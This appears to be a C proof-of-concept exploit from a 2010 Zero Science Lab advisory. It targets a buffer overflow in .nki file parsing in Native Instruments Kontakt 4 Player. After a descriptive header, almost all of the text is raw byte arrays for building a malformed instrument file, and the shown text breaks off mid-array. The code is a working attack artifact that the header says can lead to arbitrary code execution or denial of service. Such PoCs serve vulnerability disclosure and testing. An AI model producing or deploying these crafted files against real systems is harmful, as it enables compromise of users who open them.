/*
 
 
 Title: Native Instruments Kontakt 4 Player NKI File Syntactic Analysis Buffer Overflow PoC
 
 
 Vendor: Native Instruments GmbH
 Product web page: http://www.native-instruments.com
 Affected version: 4.1.3.4125 (Standalone)
 
 Summary: KONTAKT 4 PLAYER is the free sample player based on award-winning KONTAKT
 technology. Expanding the capabilities of its successful predecessor, the free
 KONTAKT 4 PLAYER allows for innovative, highly playable instruments leaving technological
 and musical limitations behind.
 
 Desc: Kontakt Player 4 suffers from a buffer overflow vulnerability when parsing ".nki"
 files. The application fails in boundry checking of the user input resulting in a crash.
 The attacker can leverage from this scenario to exectute arbitrary code on the affected
 system. Failed attempts will result in denial of service.
 
 Tested on: Microsoft Windows XP Professional SP3 (English)
 
 Vulnerability discovered by: Gjoko 'LiquidWorm' Krstic
 liquidworm gmail com
 
 Zero Science Lab - http://www.zeroscience.mk
 
 Advisory ID: ZSL-2010-4979
 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4979.php
 
 17.11.2010
 
*/
 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
 
#define FN "Vaya_con_Dios.nki"
#define PSIZE 102556
void banner(void);
 
FILE *fp;
 
void banner()
{
    printf("\n");
    printf("------------------------------------------------------------\n\n");
    printf("Kontakt 4 Player NKI File Syntactic Analysis Buffer Overflow\n\n");
    printf("\tCopyleft (c) 2010. Zero Science Lab\n\n");
    printf("------------------------------------------------------------\n");
    printf("\n");
}
 
char starter[] = {
    0x12, 0x90, 0xA8, 0x7F, 0x6C, 0x08, 0x00, 0x00, 0x00, 0x01, 0x72, 0x2A, 0x01, 0x3E, 0x01, 0x00,
    0xFF, 0x03, 0x01, 0x04, 0x34, 0x6E, 0x6F, 0x4B, 0xF2, 0x71, 0xE3, 0x4C, 0x3A, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x09,
    0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x4B, 0x6F, 0x6E, 0x74, 0x61, 0x6B,
    0x74, 0x00, 0x00, 0x00, 0x00, 0x28, 0x6E, 0x75, 0x6C, 0x6C, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x34, 0x8D, 0x9A, 0x02, 0x1D, 0x10, 0x00, 0x00, 0x78, 0x01, 0xCD, 0x5A, 0x5B, 0x6F,
    0x1B, 0xB7, 0x12, 0x7E, 0xEF, 0xAF, 0x08, 0xFC, 0x50, 0x9C, 0x3E, 0xD4, 0x5E, 0x49, 0xB6, 0x6C,
    0xE3, 0xB4, 0x29, 0x62, 0x59, 0x6A, 0x84, 0xC8, 0xB1, 0x6A, 0x39, 0x42, 0x70, 0x5E, 0x04, 0x7A,
    0x97, 0x92, 0x08, 0x53, 0xCB, 0xC5, 0x92, 0x6B, 0x4B, 0xFD, 0xF5, 0x9D, 0xD9, 0x0B, 0x6F, 0x32,
    0x65, 0xD9, 0x49, 0x7A, 0x6C, 0xB4, 0xC8, 0xEE, 0xF2, 0xE3, 0x70, 0x66, 0x38, 0x33, 0x9C, 0x19,
    0xEA, 0xB7, 0x3F, 0xD6, 0x2B, 0xFE, 0xEE, 0x81, 0xE6, 0x92, 0x89, 0xF4, 0xF7, 0x83, 0xD6, 0x61,
    0x74, 0xF0, 0xC7, 0xFB, 0x9F, 0x7E, 0xFB, 0xD4, 0x9E, 0xF5, 0x44, 0xAA, 0x08, 0x4B, 0x69, 0xFE,
    0x8E, 0xA5, 0x09, 0x5D, 0xC3, 0x58, 0xF7, 0xE0, 0x5D, 0x4A, 0x56, 0xF4, 0xF7, 0x83, 0xFF, 0xA4,
    0x05, 0xE7, 0xBF, 0x1C, 0xBC, 0x53, 0x9B, 0x0C, 0xDE, 0x24, 0x4B, 0x17, 0x9C, 0xCE, 0xB2, 0x5C,
    0x2C, 0x72, 0xB2, 0x3A, 0x30, 0xC4, 0xA2, 0xC3, 0x93, 0xE8, 0x00, 0x88, 0x8D, 0x09, 0x7C, 0xA7,
    0x0A, 0xD6, 0x80, 0x97, 0x69, 0x4D, 0x83, 0x0B, 0x92, 0x8C, 0x8B, 0x7C, 0x41, 0x13, 0x98, 0x41,
    0x78, 0x01, 0x84, 0x52, 0x71, 0x70, 0x64, 0x21, 0x14, 0xB9, 0xE3, 0xF4, 0x3A, 0xA3, 0x69, 0x08,
    0x20, 0x57, 0x84, 0xF3, 0x1B, 0x12, 0xDF, 0x7F, 0x49, 0x99, 0x0A, 0x81, 0x48, 0xB1, 0x9E, 0xD0,
    0x34, 0x91, 0x53, 0x26, 0x19, 0xD0, 0x0B, 0xC1, 0xE2, 0x22, 0x1F, 0x57, 0x02, 0xF4, 0x96, 0x24,
    0x5D, 0xD0, 0xCF, 0x05, 0x4A, 0x52, 0xF1, 0x15, 0x39, 0x6C, 0x89, 0x42, 0x65, 0x85, 0xBA, 0x22,
    0xF2, 0x5E, 0x03, 0x5A, 0x9D };
 
char body[] = {
    0x56, 0x74, 0xDA, 0x76, 0x50, 0x0F, 0x82, 0x17, 0x2B, 0xB3, 0x1A, ////////////////////////////
    0xA8, 0xC2, 0x19, 0xCE, 0x88, 0x91, 0x2A, 0x3A, 0x74, 0x86, 0x44, 0xCE, 0x16, 0x13, 0xF2, 0x40,
    0xAF, 0x44, 0x62, 0xCD, 0xDF, 0x82, 0x7C, 0xB8, 0x93, 0xB0, 0x84, 0xA2, 0x63, 0xA2, 0x96, 0x52,
    0x73, 0xE2, 0xA9, 0x10, 0x69, 0xF5, 0xC4, 0x2A, 0xCB, 0xA9, 0x94, 0x34, 0x99, 0x90, 0x55, 0xC6,
    0x69, 0x10, 0xBC, 0x24, 0xF2, 0x82, 0xD2, 0x14, 0xD7, 0x36, 0x7B, 0xB2, 0x01, 0x3C, 0x6E, 0xCA,
    0x91, 0xB3, 0x89, 0x1F, 0x0A, 0x25, 0x56, 0x44, 0x81, 0xC9, 0xE0, 0xD8, 0x58, 0xF0, 0x4D, 0xB6,
    0x14, 0xE9, 0x06, 0x37, 0x4F, 0xB0, 0x98, 0xFE, 0x99, 0x8B, 0x22, 0x6B, 0xCC, 0x26, 0x02, 0xE6,
    0x1A, 0xF3, 0x8A, 0x0E, 0xBB, 0xA5, 0x45, 0x34, 0x46, 0xB0, 0xB2, 0x65, 0xBC, 0x67, 0x9C, 0xCF,
    0x04, 0x4F, 0xA8, 0x54, 0x8E, 0xB4, 0xC0, 0xFD, 0x9C, 0xE6, 0x37, 0x94, 0x53, 0x02, 0x42, 0x68,
    0x51, 0x1B, 0xCE, 0x34, 0x2D, 0xB2, 0x86, 0x4D, 0x2B, 0xD7, 0x37, 0x22, 0x76, 0x8F, 0x1D, 0x52,
    0x2B, 0x39, 0x20, 0x09, 0xBD, 0x65, 0xD6, 0xCE, 0xB4, 0xDC, 0xDD, 0xA5, 0xEB, 0x98, 0x17, 0xE8,
    0x0B, 0xA5, 0x0C, 0x7A, 0xB1, 0x5F, 0x5B, 0x95, 0x16, 0x8C, 0x78, 0xA5, 0x4E, 0x2C, 0xC1, 0x6B,
    0xEB, 0x41, 0x13, 0x07, 0xE7, 0xA9, 0xDF, 0x2C, 0x1D, 0x54, 0x9E, 0x73, 0xDB, 0x9F, 0xDC, 0x3A,
    0xFA, 0x38, 0x0B, 0x7B, 0x48, 0x5A, 0xAC, 0x2E, 0x36, 0x8A, 0xCA, 0x7A, 0xDB, 0x6E, 0x85, 0x22,
    0x5C, 0x33, 0xE4, 0x19, 0x8D, 0xCA, 0x49, 0x2A, 0x33, 0x21, 0x43, 0x16, 0xF3, 0x7A, 0x73, 0x54,
    0x45, 0x6A, 0x11, 0x75, 0x4D, 0x95, 0x8B, 0xC7, 0x29, 0xE5, 0x22, 0x66, 0x6A, 0xA3, 0x19, 0xAB,
    0x14, 0xD5, 0x6C, 0xCA, 0x92, 0x2D, 0x96, 0xDB, 0x90, 0xF6, 0xA9, 0xB3, 0x2B, 0x40, 0xE6, 0x13,
    0x35, 0x14, 0xDC, 0x0D, 0x41, 0x0A, 0xF6, 0x68, 0xCB, 0x9B, 0x9C, 0xD0, 0x39, 0x29, 0xB8, 0x02,
    0x08, 0xFC, 0x37, 0x79, 0x64, 0x2A, 0x5E, 0x6A, 0x5E, 0xEA, 0x5D, 0x6B, 0x98, 0x49, 0xE6, 0x09,
    0x3A, 0x77, 0x4A, 0xF9, 0x38, 0x07, 0xB6, 0x49, 0x32, 0x61, 0x7F, 0x1B, 0xD9, 0xBA, 0xAD, 0xE3,
    0x63, 0x77, 0x69, 0xCE, 0xEE, 0x72, 0x92, 0x6F, 0x86, 0x97, 0x9A, 0xA0, 0x37, 0x0E, 0x24, 0x20,
    0xF6, 0x0D, 0x38, 0x59, 0x18, 0x8B, 0x3B, 0x73, 0x44, 0x5B, 0xA0, 0x27, 0x4C, 0x04, 0x17, 0x9A,
    0x84, 0xE7, 0xA1, 0x71, 0xDC, 0x3D, 0x76, 0x3C, 0x1D, 0x3F, 0xCC, 0xD0, 0x2F, 0x66, 0xB2, 0x90,
    0x18, 0x80, 0x67, 0x19, 0x18, 0xE4, 0x2C, 0x86, 0x68, 0x9C, 0x0B, 0xCE, 0x69, 0xEE, 0xD0, 0x2F,
    0x24, 0x9D, 0xA8, 0xA4, 0xD7, 0x9B, 0x9D, 0xCE, 0xC0, 0x90, 0x9B, 0x80, 0xE5, 0xBB, 0x86, 0x46,
    0xB5, 0xDA, 0xD1, 0xAC, 0xD5, 0xEE, 0x04, 0x81, 0x71, 0x7C, 0x7A, 0x45, 0xD6, 0x53, 0x2F, 0x76,
    0x39, 0x2B, 0x12, 0x70, 0xFD, 0x11, 0x08, 0xEE, 0x30, 0xED, 0x2F, 0x48, 0x62, 0xC5, 0x1E, 0xAA,
    0x30, 0x30, 0x4C, 0xD6, 0x7A, 0x39, 0x57, 0x7D, 0x32, 0xCE, 0x59, 0xA6, 0x60, 0xBC, 0x9F, 0x30,
    0x65, 0x39, 0xB6, 0x8B, 0x62, 0xF3, 0xF5, 0x05, 0x05, 0x2D, 0x7B, 0x20, 0x4F, 0x8D, 0x2C, 0x59,
    0x0F, 0x07, 0x5F, 0x9F, 0x02, 0xBA, 0xD4, 0xE4, 0x5E, 0xD4, 0x56, 0x24, 0xC3, 0xE5, 0x46, 0x4C,
    0x2A, 0x47, 0x4C, 0x6F, 0xD1, 0x06, 0x26, 0xE2, 0x7B, 0x8B, 0x7D, 0x0F, 0x04, 0x9C, 0x4D, 0xF6,
    0xE1, 0x0C, 0x0C, 0x05, 0x4F, 0x48, 0x3C, 0xEF, 0x26, 0xA2, 0xC8, 0x63, 0x63, 0x98, 0x1E, 0x41,
    0x0B, 0xF8, 0x61, 0x95, 0x69, 0xDD, 0x7A, 0xA8, 0x22, 0xBB, 0x14, 0x8F, 0xE9, 0x15, 0x5B, 0x23,
    0x41, 0x37, 0x96, 0x79, 0x48, 0x0A, 0x92, 0x8A, 0x1C, 0x61, 0x57, 0x24, 0x48, 0xCE, 0x80, 0xAA,
    0x68, 0x14, 0x5A, 0xD6, 0xE0, 0xF6, 0x5C, 0x73, 0x52, 0x1A, 0xC1, 0xF3, 0xE4, 0x20, 0xA0, 0x06,
    0x99, 0xAB, 0xF7, 0x61, 0x42, 0x79, 0xB9, 0xA8, 0xBC, 0x4E, 0xB9, 0x89, 0x26, 0x9E, 0xB4, 0x60,
    0x4E, 0x7E, 0x26, 0xE0, 0x1B, 0x2F, 0xD8, 0xC8, 0x73, 0x10, 0xF0, 0xCF, 0x67, 0x21, 0x44, 0xC2,
    0x7E, 0xFE, 0x4F, 0xA4, 0xD4, 0xF6, 0x00, 0x2F, 0x22, 0xDD, 0x11, 0x05, 0xA0, 0x0D, 0x9C, 0x5B,
    0x37, 0xE2, 0x71, 0x2B, 0x45, 0x09, 0x82, 0x7B, 0xE8, 0xA0, 0xE9, 0x9E, 0xF8, 0xE1, 0x4D, 0xCF,
    0xE7, 0xD5, 0xD3, 0x49, 0x46, 0xF3, 0xF9, 0x94, 0xD1, 0xC7, 0x6A, 0x2F, 0x76, 0xB0, 0x1B, 0x13,
    0x35, 0x84, 0x40, 0x64, 0x23, 0xDA, 0x6E, 0xBC, 0x63, 0xA9, 0x54, 0x39, 0x24, 0x3E, 0xA9, 0xEA,
    0xE5, 0x68, 0x0B, 0x26, 0x2E, 0xD6, 0x39, 0xA3, 0x9D, 0xE0, 0x19, 0x30, 0xE4, 0x13, 0x4B, 0x91,
    0x6B, 0x2B, 0xF8, 0x84, 0xA9, 0xE7, 0xBD, 0x9B, 0x05, 0x18, 0xF0, 0x97, 0x9B, 0x91, 0x46, 0xEE,
    0xA4, 0xDA, 0x23, 0xAA, 0xA5, 0x91, 0x6E, 0x1C, 0x30, 0xD4, 0x00, 0xD4, 0xDE, 0x07, 0x64, 0x82,
    0x66, 0x45, 0xC9, 0x4D, 0x88, 0x2A, 0xD5, 0x49, 0x94, 0xCE, 0xCD, 0x8D, 0xAE, 0x44, 0x9E, 0x2D,
    0x2B, 0xB3, 0xC4, 0xC1, 0xF2, 0x15, 0xFC, 0xAC, 0x44, 0xBE, 0x3E, 0x6F, 0xC2, 0x64, 0x42, 0x33,
    0xFD, 0x33, 0x57, 0xFF, 0x35, 0xF2, 0xBC, 0x77, 0xA2, 0x35, 0x1E, 0x24, 0x1A, 0xF8, 0x23, 0x12,
    0xAC, 0x8E, 0x9B, 0xF6, 0xFE, 0xF8, 0x04, 0x6B, 0x98, 0x4A, 0x9A, 0xAB, 0xC1, 0xD7, 0x2A, 0xCF,
    0xEA, 0xCF, 0xE7, 0x34, 0x56, 0x4D, 0x9A, 0x75, 0x0A, 0xA2, 0x9A, 0x54, 0xB3, 0x2A, 0x3E, 0x9A,
    0xC3, 0xDF, 0x0A, 0x9B, 0x5A, 0x21, 0x9E, 0x1F, 0xC4, 0x9C, 0x48, 0x19, 0x3C, 0xED, 0xEF, 0x36,
    0x19, 0x0C, 0x87, 0xE6, 0x42, 0xF4, 0x1E, 0xD1, 0x07, 0x6A, 0x12, 0xB4, 0x96, 0x9B, 0x2A, 0x35,
    0xE3, 0x97, 0xB9, 0x09, 0x4D, 0x1E, 0x44, 0x42, 0x99, 0x32, 0xF8, 0x7A, 0x5D, 0x28, 0x48, 0xB5,
    0x15, 0xC3, 0xE4, 0x5A, 0x2F, 0x56, 0x47, 0x02, 0x2C, 0x64, 0xCA, 0x55, 0x64, 0x58, 0x4E, 0x8E,
    0x5C, 0xCC, 0x4C, 0x2E, 0xE0, 0x2D, 0x52, 0x0D, 0x1B, 0xB7, 0x78, 0x72, 0xD8, 0x38, 0xC4, 0x93,
    0xC3, 0xC6, 0x15, 0x9E, 0x1C, 0x3E, 0xD6, 0x6C, 0x3F, 0x39, 0x7C, 0xB2, 0x7B, 0x18, 0x8A, 0xCC,
    0xBA, 0xEC, 0x7A, 0x72, 0x36, 0x6E, 0x71, 0x55, 0x95, 0xD5, 0xC3, 0x47, 0x46, 0x29, 0x60, 0x12,
    0x47, 0x90, 0x7B, 0x57, 0x36, 0x81, 0x2F, 0x75, 0x16, 0x6E, 0x99, 0x4C, 0xFD, 0x05, 0xE7, 0x0C,
    0xBE, 0xA2, 0x43, 0x56, 0xAE, 0x59, 0x19, 0x53, 0xF9, 0xDC, 0xD8, 0x12, 0x68, 0xB0, 0x4A, 0xD9,
    0xAB, 0xAF, 0xA8, 0x31, 0x63, 0x5A, 0xE7, 0xE1, 0xAC, 0xDD, 0xCB, 0xB4, 0x3D, 0x21, 0x76, 0xD4,
    0x7D, 0xBB, 0x12, 0xED, 0x7B, 0xBA, 0xB9, 0xCD, 0xA1, 0xD0, 0x85, 0x3C, 0x48, 0xCB, 0xEF, 0x1F,
    0x5B, 0x39, 0x6C, 0x7C, 0x6E, 0x15, 0x00, 0x9E, 0x71, 0x43, 0xC6, 0x8B, 0xF5, 0xD3, 0x2D, 0x54,
    0x84, 0x0B, 0x48, 0x22, 0x1B, 0x2D, 0xEE, 0x44, 0x7D, 0x16, 0x0A, 0xCA, 0xD0, 0x54, 0x60, 0x71,
    0xC7, 0x62, 0x3D, 0x67, 0x6B, 0x65, 0x2E, 0x91, 0x6C, 0x4F, 0x14, 0x29, 0x9C, 0x66, 0x1A, 0xE6,
    0x46, 0x5C, 0x70, 0x00, 0xBF, 0x6C, 0xF6, 0xCE, 0xB7, 0x15, 0x4B, 0x58, 0x9D, 0x9F, 0x6B, 0x1A,
    0x1E, 0xE4, 0x41, 0x57, 0x97, 0x21, 0xC4, 0x02, 0x13, 0xEE, 0xDD, 0x7D, 0x05, 0xE0, 0xE4, 0x06,
    0xFE, 0x07, 0x5D, 0xCE, 0x8C, 0x1F, 0x44, 0xDE, 0x9F, 0x13, 0x45, 0xAD, 0x19, 0xC6, 0x35, 0xBC,
    0x09, 0x5B, 0xAF, 0x21, 0x0A, 0xC6, 0x7B, 0xB6, 0xA6, 0x3C, 0xF3, 0x21, 0x44, 0xD1, 0x38, 0xDC,
    0x33, 0x04, 0x9E, 0x1D, 0x0E, 0xAD, 0x60, 0x7C, 0xF6, 0x59, 0x12, 0x2F, 0x04, 0x84, 0x56, 0x34,
    0x61, 0xE0, 0x85, 0x04, 0x5F, 0x0C, 0x0F, 0x71, 0x60, 0x22, 0xCD, 0x8B, 0x49, 0x7E, 0xE3, 0x84,
    0x10, 0x47, 0x67, 0xDA, 0xE8, 0xBF, 0x71, 0x81, 0x6F, 0x9E, 0x1E, 0xE2, 0xF0, 0xFC, 0xCD, 0x70,
    0xE8, 0x8B, 0x18, 0xE2, 0xD8, 0xAA, 0x9A, 0xFD, 0x29, 0x6F, 0xED, 0x3D, 0x28, 0x42, 0x38, 0x8A,
    0xBD, 0x35, 0x11, 0x7C, 0x7E, 0x82, 0x22, 0xED, 0x1F, 0x66, 0x7D, 0x92, 0x6F, 0xED, 0x3D, 0x28,
    0xE2, 0xEB, 0xCF, 0x81, 0xB7, 0x26, 0xA2, 0xCF, 0x4F, 0x50, 0xE4, 0xEF, 0x77, 0x50, 0xF9, 0x4B,
    0xBE, 0xB5, 0xF7, 0xA0, 0x0A, 0x7E, 0xDC, 0x49, 0xFA, 0xD6, 0x54, 0xE0, 0xF3, 0x13, 0x54, 0xC9,
    0xBF, 0x77, 0xD4, 0xFB, 0x2C, 0xBD, 0xB5, 0x77, 0x47, 0x45, 0xF3, 0x35, 0xF4, 0x59, 0xA0, 0xC3,
    0x37, 0xC9, 0x38, 0x53, 0x63, 0xC1, 0x52, 0xA5, 0x0F, 0xD7, 0xAE, 0x03, 0x94, 0x90, 0xD9, 0xC7,
    0xD0, 0x40, 0x1D, 0x88, 0xBC, 0x0F, 0x2D, 0x17, 0x8D, 0xF2, 0xD3, 0xF4, 0x06, 0x37, 0xAC, 0xFA,
    0x81, 0x88, 0xB5, 0x7A, 0x2E, 0x5E, 0x21, 0xF0, 0x37, 0x34, 0xAE, 0x9A, 0x06, 0xD3, 0x10, 0x3B,
    0x83, 0xD8, 0x0C, 0xC5, 0x26, 0x51, 0x90, 0x7C, 0xDD, 0xCB, 0xEA, 0x51, 0xCE, 0xA1, 0x3F, 0x65,
    0x51, 0x76, 0xEB, 0x80, 0x1A, 0x36, 0xDA, 0xD5, 0xF3, 0xAF, 0x31, 0x1F, 0xBD, 0xD6, 0xBF, 0x4B,
    0x68, 0xAF, 0x4E, 0x2E, 0x4B, 0xD6, 0xFB, 0x34, 0x5F, 0xA1, 0x6A, 0x10, 0x0F, 0xF4, 0x42, 0xAC,
    0xAD, 0xEA, 0xDF, 0x2B, 0x3D, 0x40, 0xFF, 0x34, 0xCF, 0xFE, 0x2A, 0x08, 0xEC, 0x86, 0x29, 0xE1,
    0x53, 0x91, 0xC3, 0x25, 0xA4, 0xB3, 0x1D, 0x2B, 0xE8, 0xE3, 0x9A, 0x5B, 0x2A, 0x4F, 0xAD, 0x70,
    0x67, 0x27, 0xB6, 0x47, 0xDD, 0x5E, 0x92, 0xDB, 0x40, 0x1A, 0x73, 0xB2, 0x19, 0x0B, 0x79, 0x3D,
    0x9F, 0x4B, 0xAA, 0xEC, 0x1A, 0x14, 0xDA, 0x1B, 0x58, 0xC0, 0x8E, 0x84, 0xC8, 0x82, 0x83, 0x65,
    0xED, 0x3A, 0x51, 0xD0, 0x4F, 0x40, 0x28, 0x92, 0xBA, 0x83, 0x2A, 0x12, 0x7B, 0xDA, 0x86, 0x12,
    0x5E, 0xF9, 0xC2, 0x60, 0xD3, 0x27, 0xC1, 0x3B, 0x5D, 0xBD, 0xC7, 0xD0, 0xCC, 0xA3, 0x64, 0x85,
    0x55, 0x27, 0xCE, 0x6F, 0x20, 0x32, 0xA3, 0x96, 0x0C, 0x5E, 0x85, 0xCB, 0xE9, 0x82, 0xA8, 0xE0,
    0x75, 0x87, 0xCC, 0xE0, 0x0A, 0x22, 0x1A, 0x30, 0x6E, 0x17, 0x8A, 0xEE, 0x95, 0x11, 0x5A, 0xDE,
    0xA8, 0x6C, 0xA9, 0x4F, 0x9C, 0x75, 0x6A, 0x4D, 0x1E, 0xD9, 0x52, 0x00, 0x53, 0xA5, 0x88, 0x4D,
    0x85, 0x8F, 0x5C, 0x0E, 0x53, 0x6C, 0xDA, 0x17, 0x1C, 0xB8, 0x28, 0x2F, 0x9C, 0xA1, 0x23, 0x50,
    0x7D, 0xB2, 0x2A, 0x7B, 0xAB, 0x94, 0xAF, 0x2E, 0xE0, 0x6E, 0x09, 0xDC, 0x44, 0x2B, 0xBC, 0xBC,
    0xAB, 0x9E, 0x0C, 0xD6, 0x92, 0x1B, 0xF4, 0x08, 0x20, 0xAD, 0x9C, 0xBA, 0xD2, 0xB7, 0x35, 0x83,
    0x46, 0x92, 0x4A, 0xDB, 0x40, 0x3C, 0xED, 0x48, 0x2E, 0xF0, 0xC6, 0x43, 0xD3, 0xF0, 0x8C, 0x6C,
    0xEE, 0x5C, 0x25, 0xB5, 0x5D, 0x83, 0x97, 0x2B, 0x21, 0xD4, 0x12, 0x36, 0xA3, 0x27, 0xE8, 0x5C,
    0x53, 0x70, 0x31, 0x4E, 0x63, 0xB0, 0xFF, 0x79, 0x3A, 0xFB, 0xF0, 0xF1, 0x72, 0x72, 0x33, 0x9B,
    0x5E, 0x8F, 0xBE, 0x5C, 0xF5, 0x9D, 0x4D, 0x0C, 0xDE, 0xAE, 0x1F, 0x55, 0x1A, 0x00, 0xB9, 0xEB,
    0x27, 0xFB, 0xD6, 0x7E, 0x8F, 0x2E, 0xDA, 0xEE, 0x3E, 0x59, 0x4E, 0x95, 0xD7, 0x81, 0xD8, 0x0A,
    0x53, 0x6C, 0x85, 0x9B, 0x47, 0x3F, 0xB5, 0x2F, 0x07, 0x97, 0x70, 0x15, 0x55, 0x6F, 0xA6, 0xDD,
    0x0E, 0xF3, 0xA7, 0xEC, 0x6E, 0xDC, 0x3D, 0xAD, 0x93, 0x52, 0x19, 0xFD, 0x14, 0x9A, 0x65, 0x22,
    0xA3, 0xF5, 0x2F, 0x19, 0xC8, 0x32, 0x91, 0xD8, 0xBF, 0xF0, 0x1B, 0x3D, 0x8D, 0xE1, 0x13, 0x75,
    0xDF, 0x2B, 0xF2, 0x07, 0xBB, 0x0B, 0xF3, 0x6B, 0x74, 0xD8, 0xE9, 0xB4, 0xCE, 0xE1, 0xEF, 0xEC,
    0xB4, 0xD3, 0xED, 0x9C, 0xB5, 0x4E, 0x3A, 0xAE, 0x39, 0x43, 0x87, 0x1F, 0x5C, 0xCE, 0x6C, 0x97,
    0xDB, 0x16, 0x4C, 0x68, 0x4C, 0x4C, 0x34, 0x39, 0x89, 0xBC, 0x6B, 0xDD, 0x25, 0x5C, 0x87, 0x87,
    0xA6, 0xD6, 0x0D, 0x1D, 0x3D, 0xDC, 0xF1, 0x27, 0xD7, 0xF7, 0x87, 0x1A, 0xE0, 0x99, 0x62, 0x0A,
    0xCD, 0x1D, 0x08, 0x1C, 0x23, 0xF8, 0x69, 0x00, 0x06, 0x04, 0x0D, 0x6B, 0xFC, 0xAC, 0xD1, 0x0D,
    0x1A, 0x82, 0xF6, 0x21, 0x7C, 0xF1, 0x1D, 0xAC, 0xBF, 0xDE, 0x72, 0xB8, 0xEA, 0x93, 0x71, 0x22,
    0xA3, 0xD2, 0x3A, 0xDA, 0xFC, 0x30, 0x7F, 0x83, 0xED, 0x38, 0xEF, 0x9C, 0x46, 0x11, 0x6C, 0x47,
    0x2B, 0x8A, 0xBA, 0x51, 0xCB, 0xED, 0x4F, 0xFF, 0xAB, 0xFE, 0xF7, 0x1D, 0xFC, 0xCD, 0x89, 0xC6,
    0xB4, 0x54, 0xB4, 0x43, 0x55, 0xBA, 0x57, 0x85, 0x68, 0xCD, 0xE5, 0x6D, 0xBC, 0x1B, 0x94, 0xA0,
    0x99, 0x4C, 0xF8, 0x14, 0xDB, 0xA6, 0x7A, 0x97, 0xBD, 0xC0, 0xB3, 0xDB, 0x69, 0xA5, 0x76, 0x49,
    0x30, 0x0A, 0xFC, 0xF5, 0xC4, 0x2B, 0x7C, 0xD2, 0xF5, 0x0A, 0xC7, 0x27, 0xA7, 0xFD, 0x91, 0x1D,
    0xA1, 0xCA, 0x1E, 0x6E, 0x29, 0x2A, 0x58, 0x1B, 0xF6, 0x73, 0xCB, 0xE7, 0xC6, 0x98, 0xEC, 0x46,
    0xEC, 0x37, 0x18, 0x53, 0x56, 0xFE, 0x50, 0xC0, 0x55, 0x93, 0x1F, 0xBB, 0xA3, 0xC3, 0x56, 0x17,
    0xFF, 0xC0, 0xB9, 0x8F, 0x4F, 0xCE, 0xDB, 0xF8, 0xE8, 0x2A, 0xFF, 0xBB, 0x07, 0xF3, 0x76, 0x7D,
    0xA8, 0x37, 0x01, 0xC7, 0x51, 0x93, 0xB3, 0xF6, 0xEB, 0xC2, 0xF7, 0x0B, 0xCD, 0xA9, 0x54, 0xD2,
    0x05, 0xF4, 0xCA, 0x9D, 0xA5, 0x19, 0xFC, 0xDA, 0xEA, 0xFF, 0x6F, 0x4F, 0xAE, 0x5F, 0x3B, 0x8A,
    0x1A, 0x5F, 0xCC, 0xC6, 0xC3, 0xDB, 0xDE, 0xC7, 0x92, 0x6B, 0xC7, 0x9A, 0x8E, 0xFC, 0x58, 0x85,
    0xA3, 0x65, 0x06, 0x81, 0x81, 0xAD, 0x7C, 0xC0, 0xD3, 0x0E, 0x6F, 0x6D, 0xF1, 0xDF, 0x23, 0xFD,
    0x00, 0xB0, 0xFA, 0xEA, 0x00, 0x3F, 0xD7, 0x8F, 0x25, 0x04, 0x46, 0xF4, 0x2F, 0xE5, 0xDE, 0xFF,
    0xF4, 0x0F, 0x39, 0xE0, 0x69, 0x7F, 0xAE, 0xE1, 0x0E, 0xB0, 0x01, 0x01, 0x0C, 0x00, 0xD9, 0x00,
    0x00, 0x00 };
 
char tail[] = {
    0x3C, 0x3F, 0x78, 0x6D, 0x6C, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, //////////
    0x22, 0x31, 0x2E, 0x30, 0x22, 0x20, 0x65, 0x6E, 0x63, 0x6F, 0x64, 0x69, 0x6E, 0x67, 0x3D, 0x22,
    0x55, 0x54, 0x46, 0x2D, 0x38, 0x22, 0x20, 0x73, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x6C, 0x6F, 0x6E,
    0x65, 0x3D, 0x22, 0x6E, 0x6F, 0x22, 0x20, 0x3F, 0x3E, 0x0A, 0x3C, 0x73, 0x6F, 0x75, 0x6E, 0x64,
    0x69, 0x6E, 0x66, 0x6F, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x22, 0x34, 0x30,
    0x30, 0x22, 0x3E, 0x0A, 0x0A, 0x20, 0x20, 0x3C, 0x70, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x69,
    0x65, 0x73, 0x2F, 0x3E, 0x0A, 0x0A, 0x20, 0x20, 0x3C, 0x61, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75,
    0x74, 0x65, 0x73, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x61, 0x74, 0x74, 0x72, 0x69, 0x62,
    0x75, 0x74, 0x65, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x76, 0x61, 0x6C, 0x75,
    0x65, 0x3E, 0x4B, 0x6F, 0x6E, 0x74, 0x61, 0x6B, 0x74, 0x49, 0x6E, 0x73, 0x74, 0x72, 0x75, 0x6D,
    0x65, 0x6E, 0x74, 0x3C, 0x2F, 0x76, 0x61, 0x6C, 0x75, 0x65, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20,
